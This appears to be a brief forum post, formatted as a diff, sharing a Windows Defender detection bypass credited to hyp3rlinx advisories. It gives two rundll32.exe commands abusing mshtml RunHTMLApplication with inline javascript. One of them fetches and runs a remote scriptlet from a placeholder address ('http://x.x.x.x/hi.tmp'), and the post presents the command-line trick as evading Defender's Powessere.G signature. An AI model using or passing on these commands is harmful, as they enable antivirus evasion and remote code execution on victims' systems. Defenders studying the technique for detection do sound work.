@@ -1,0 +1,15 @@
+In 2022 hyp3rlinx identified a vulnerability for Windows that allows the bypass of Windows Defender.
+Hidden Content
+https://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt
+
+
+The vulnerability has since been fixed by Microsoft, but another article recently came out (Feb. 7, 2024) demonstrating how adding a simple comma to the command no longer blocks it by Defender.
+Hidden Content
+https://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_TROJAN.WIN32.POWESSERE.G_MITIGATION_BYPASS_PART2.txt
+
+
+PLUS: Bypassing Windows Defender Trojan:Win32/Powessere.G detection
+Hidden Content
+C:>rundll32.exe javascript:"......\mshtml,RunHTMLApplication ";alert(666)
+
+C:>rundll32.exe javascript:"......\mshtml,RunHTMLApplication ";document.write();GetObject("script"+":"+"http://x.x.x.x/hi.tmp")
